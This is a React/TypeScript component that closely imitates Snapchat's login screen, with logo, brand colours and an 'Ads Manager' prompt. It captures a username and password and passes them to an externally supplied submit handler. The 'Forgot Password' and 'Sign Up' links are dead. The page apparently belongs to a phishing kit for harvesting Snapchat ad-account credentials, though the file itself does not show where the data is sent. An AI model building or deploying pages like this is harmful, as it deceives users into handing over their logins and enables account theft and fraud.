'use client'

import { useState } from 'react'

interface SnapchatPageProps {
  onSubmit: (data: { username?: string; password?: string }) => void
}

export function SnapchatPage({ onSubmit }: SnapchatPageProps) {
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [loading, setLoading] = useState(false)

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoading(true)
    await onSubmit({ username, password })
    setLoading(false)
  }

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center" style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif' }}>
      <div className="w-full max-w-[400px] px-6 py-12">
        {/* Snapchat Ghost Logo */}
        <div className="flex justify-center mb-8">
          <img src="/snap_logo.png" alt="Snapchat" className="h-20 w-auto" />
        </div>

        {/* Heading */}
        <h1 className="text-3xl font-bold text-center mb-2" style={{ color: '#000000' }}>Log In</h1>
        
        {/* Subheading */}
        <p className="text-sm text-center mb-8" style={{ color: '#8E8E93' }}>
          to continue to Ads Manager
        </p>

        {/* Form */}
        <form onSubmit={handleSubmit} className="space-y-6">
          {/* Username Field */}
          <div>
            <label className="block text-sm mb-2" style={{ color: '#8E8E93' }}>Username or Email</label>
            <input
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full px-4 py-3 text-base border border-gray-300 rounded focus:outline-none focus:border-black"
              style={{ borderColor: '#E5E5EA', backgroundColor: '#FFFFFF' }}
              required
            />
          </div>

          {/* Password Field */}
          <div>
            <div className="flex items-center justify-between mb-2">
              <label className="block text-sm" style={{ color: '#8E8E93' }}>Password</label>
              <a href="#" className="text-sm hover:underline" style={{ color: '#8E8E93' }}>Forgot Password</a>
            </div>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-4 py-3 text-base border border-gray-300 rounded focus:outline-none focus:border-black"
              style={{ borderColor: '#E5E5EA', backgroundColor: '#FFFFFF' }}
              required
            />
          </div>

          {/* Log In Button */}
          <button
            type="submit"
            disabled={loading}
            className="w-full py-3 text-base font-bold rounded-lg disabled:opacity-50 disabled:cursor-not-allowed"
            style={{ backgroundColor: '#FFFC00', color: '#000000' }}
          >
            {loading ? 'Logging in...' : 'Log In'}
          </button>
        </form>
      </div>

      {/* Footer */}
      <div className="absolute bottom-0 left-0 right-0 py-6 text-center" style={{ backgroundColor: '#F2F2F7' }}>
        <p className="text-sm" style={{ color: '#8E8E93' }}>
          New To Snapchat?{' '}
          <a href="#" className="font-bold hover:underline" style={{ color: '#000000' }}>Sign Up</a>
        </p>
      </div>
    </div>
  )
}

